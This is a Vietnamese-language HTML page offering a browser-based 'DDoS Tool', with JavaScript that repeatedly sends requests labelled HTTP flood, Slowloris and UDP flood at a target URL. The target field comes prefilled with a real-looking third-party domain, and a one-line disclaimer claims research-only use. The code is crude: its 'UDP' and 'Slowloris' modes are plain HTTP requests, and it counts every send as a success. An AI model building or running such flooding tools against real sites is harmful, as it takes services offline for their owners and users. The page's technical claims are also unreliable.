<!DOCTYPE html>
<html lang="vi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>DDoS Tool - Tấn Công Web</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            background: linear-gradient(135deg, #0f0f0f, #1a1a1a);
            color: #00ff00;
            font-family: 'Courier New', monospace;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
        }
        
        .container {
            background: rgba(0, 0, 0, 0.9);
            border: 2px solid #00ff00;
            border-radius: 15px;
            padding: 40px;
            box-shadow: 0 0 50px rgba(0, 255, 0, 0.3);
            width: 600px;
            text-align: center;
        }
        
        h1 {
            color: #ff0000;
            text-shadow: 0 0 10px #ff0000;
            font-size: 32px;
            margin-bottom: 10px;
            letter-spacing: 3px;
        }
        
        .subtitle {
            color: #00ff00;
            margin-bottom: 30px;
            font-size: 14px;
            opacity: 0.8;
        }
        
        .input-group {
            margin-bottom: 20px;
            text-align: left;
        }
        
        label {
            display: block;
            margin-bottom: 8px;
            color: #00ff00;
            font-weight: bold;
        }
        
        input, select {
            width: 100%;
            padding: 15px;
            background: #111;
            border: 1px solid #00ff00;
            color: #00ff00;
            border-radius: 8px;
            font-size: 16px;
            font-family: 'Courier New', monospace;
            outline: none;
            transition: all 0.3s;
        }
        
        input:focus, select:focus {
            border-color: #ff0000;
            box-shadow: 0 0 20px rgba(255, 0, 0, 0.5);
        }
        
        input::placeholder {
            color: #004400;
        }
        
        .btn-attack {
            width: 100%;
            padding: 18px;
            background: #ff0000;
            color: #fff;
            border: none;
            border-radius: 8px;
            font-size: 20px;
            font-weight: bold;
            cursor: pointer;
            margin-top: 10px;
            text-transform: uppercase;
            letter-spacing: 2px;
            transition: all 0.3s;
            animation: pulse 2s infinite;
        }
        
        .btn-attack:hover {
            background: #cc0000;
            box-shadow: 0 0 30px #ff0000;
            transform: scale(1.05);
        }
        
        .btn-attack:active {
            transform: scale(0.95);
        }
        
        .btn-stop {
            width: 100%;
            padding: 18px;
            background: #333;
            color: #ff0000;
            border: 2px solid #ff0000;
            border-radius: 8px;
            font-size: 20px;
            font-weight: bold;
            cursor: pointer;
            margin-top: 10px;
            display: none;
        }
        
        @keyframes pulse {
            0% { opacity: 1; }
            50% { opacity: 0.7; }
            100% { opacity: 1; }
        }
        
        .stats {
            margin-top: 20px;
            padding: 15px;
            background: #111;
            border: 1px solid #00ff00;
            border-radius: 8px;
            display: none;
        }
        
        .stat-item {
            display: flex;
            justify-content: space-between;
            margin-bottom: 10px;
            color: #00ff00;
        }
        
        .log {
            margin-top: 20px;
            padding: 15px;
            background: #000;
            border: 1px solid #333;
            border-radius: 8px;
            max-height: 200px;
            overflow-y: auto;
            text-align: left;
            font-size: 12px;
            display: none;
        }
        
        .warning {
            color: #ff0000;
            font-size: 12px;
            margin-top: 20px;
            border-top: 1px solid #333;
            padding-top: 15px;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>⚡ DDoS TOOL ⚡</h1>
        <p class="subtitle">CÔNG CỤ TẤN CÔNG TỪ CHỐI DỊCH VỤ</p>
        
        <div class="input-group">
            <label>🎯 URL MỤC TIÊU:</label>
            <input type="text" id="targetUrl" placeholder="https://khoindvn.io.vn/" value="https://khoindvn.io.vn/">
        </div>
        
        <div class="input-group">
            <label>⚙️ PHƯƠNG THỨC:</label>
            <select id="method">
                <option value="1">HTTP Flood</option>
                <option value="2">Slowloris</option>
                <option value="3">UDP Flood</option>
                <option value="4">TẤT CẢ (Hỗn Hợp)</option>
            </select>
        </div>
        
        <div class="input-group">
            <label>🔢 SỐ LUỒNG:</label>
            <input type="number" id="threads" value="500" min="1" max="5000">
        </div>
        
        <button class="btn-attack" id="attackBtn" onclick="startAttack()">💥 TẤN CÔNG 💥</button>
        <button class="btn-stop" id="stopBtn" onclick="stopAttack()">🛑 DỪNG LẠI</button>
        
        <div class="stats" id="stats">
            <div class="stat-item">
                <span>📊 REQUEST ĐÃ GỬI:</span>
                <span id="requestCount">0</span>
            </div>
            <div class="stat-item">
                <span>✅ THÀNH CÔNG:</span>
                <span id="successCount">0</span>
            </div>
            <div class="stat-item">
                <span>❌ THẤT BẠI:</span>
                <span id="failCount">0</span>
            </div>
            <div class="stat-item">
                <span>⏱️ THỜI GIAN:</span>
                <span id="timeCount">0s</span>
            </div>
        </div>
        
        <div class="log" id="logBox"></div>
        
        <p class="warning">⚠️ CẢNH BÁO: Chỉ sử dụng cho mục đích nghiên cứu bảo mật!</p>
    </div>

    <script>
        let running = false;
        let workers = [];
        let requestCount = 0;
        let successCount = 0;
        let failCount = 0;
        let startTime = 0;
        let timerInterval = null;

        function log(message, type = 'info') {
            const logBox = document.getElementById('logBox');
            logBox.style.display = 'block';
            const line = document.createElement('div');
            line.style.color = type === 'success' ? '#00ff00' : type === 'error' ? '#ff0000' : '#00ff00';
            line.textContent = `[${new Date().toLocaleTimeString()}] ${message}`;
            logBox.appendChild(line);
            logBox.scrollTop = logBox.scrollHeight;
            
            if (logBox.children.length > 50) {
                logBox.removeChild(logBox.firstChild);
            }
        }

        function updateStats() {
            document.getElementById('requestCount').textContent = requestCount;
            document.getElementById('successCount').textContent = successCount;
            document.getElementById('failCount').textContent = failCount;
            document.getElementById('timeCount').textContent = Math.floor((Date.now() - startTime) / 1000) + 's';
        }

        function httpFlood(target) {
            return function() {
                while (running) {
                    try {
                        const xhr = new XMLHttpRequest();
                        xhr.open('GET', target + '?rand=' + Math.random(), true);
                        xhr.setRequestHeader('X-Forwarded-For', Math.floor(Math.random() * 255) + '.' + Math.floor(Math.random() * 255) + '.' + Math.floor(Math.random() * 255) + '.' + Math.floor(Math.random() * 255));
                        xhr.setRequestHeader('Cache-Control', 'no-cache');
                        xhr.send();
                        requestCount++;
                        successCount++;
                        log('HTTP Request gửi thành công', 'success');
                        updateStats();
                    } catch(e) {
                        requestCount++;
                        failCount++;
                        log('HTTP Request thất bại', 'error');
                        updateStats();
                    }
                }
            };
        }

        function slowloris(target) {
            return function() {
                while (running) {
                    try {
                        const img = new Image();
                        img.src = target + '?slow=' + Math.random();
                        requestCount++;
                        successCount++;
                        log('Slowloris packet sent', 'success');
                        updateStats();
                    } catch(e) {
                        failCount++;
                        log('Slowloris failed', 'error');
                        updateStats();
                    }
                }
            };
        }

        function udpFlood(target) {
            return function() {
                while (running) {
                    try {
                        const xhr = new XMLHttpRequest();
                        xhr.open('POST', target, true);
                        xhr.setRequestHeader('Content-Type', 'application/octet-stream');
                        const data = new ArrayBuffer(1400);
                        xhr.send(data);
                        requestCount++;
                        successCount++;
                        log('UDP packet sent', 'success');
                        updateStats();
                    } catch(e) {
                        failCount++;
                        log('UDP failed', 'error');
                        updateStats();
                    }
                }
            };
        }

        function startAttack() {
            const target = document.getElementById('targetUrl').value;
            const method = document.getElementById('method').value;
            const threadCount = parseInt(document.getElementById('threads').value);
            
            if (!target) {
                alert('Vui lòng nhập URL mục tiêu!');
                return;
            }
            
            running = true;
            requestCount = 0;
            successCount = 0;
            failCount = 0;
            startTime = Date.now();
            
            document.getElementById('stats').style.display = 'block';
            document.getElementById('logBox').style.display = 'block';
            document.getElementById('attackBtn').style.display = 'none';
            document.getElementById('stopBtn').style.display = 'block';
            
            document.getElementById('logBox').innerHTML = '';
            log('🚀 BẮT ĐẦU TẤN CÔNG: ' + target);
            log('⚡ Phương thức: ' + method);
            log('🔧 Số luồng: ' + threadCount);
            
            timerInterval = setInterval(updateStats, 1000);
            
            let attackFunctions = [];
            if (method === '1') attackFunctions = [httpFlood(target)];
            else if (method === '2') attackFunctions = [slowloris(target)];
            else if (method === '3') attackFunctions = [udpFlood(target)];
            else if (method === '4') attackFunctions = [httpFlood(target), slowloris(target), udpFlood(target)];
            
            for (let i = 0; i < threadCount; i++) {
                setTimeout(() => {
                    if (running) {
                        const randomAttack = attackFunctions[Math.floor(Math.random() * attackFunctions.length)];
                        randomAttack();
                    }
                }, i * 10);
            }
        }

        function stopAttack() {
            running = false;
            clearInterval(timerInterval);
            
            document.getElementById('attackBtn').style.display = 'block';
            document.getElementById('stopBtn').style.display = 'none';
            
            log('🛑 ĐÃ DỪNG TẤN CÔNG');
            log('📊 Tổng request: ' + requestCount);
            log('✅ Thành công: ' + successCount);
            log('❌ Thất bại: ' + failCount);
        }
    </script>
</body>
</html>
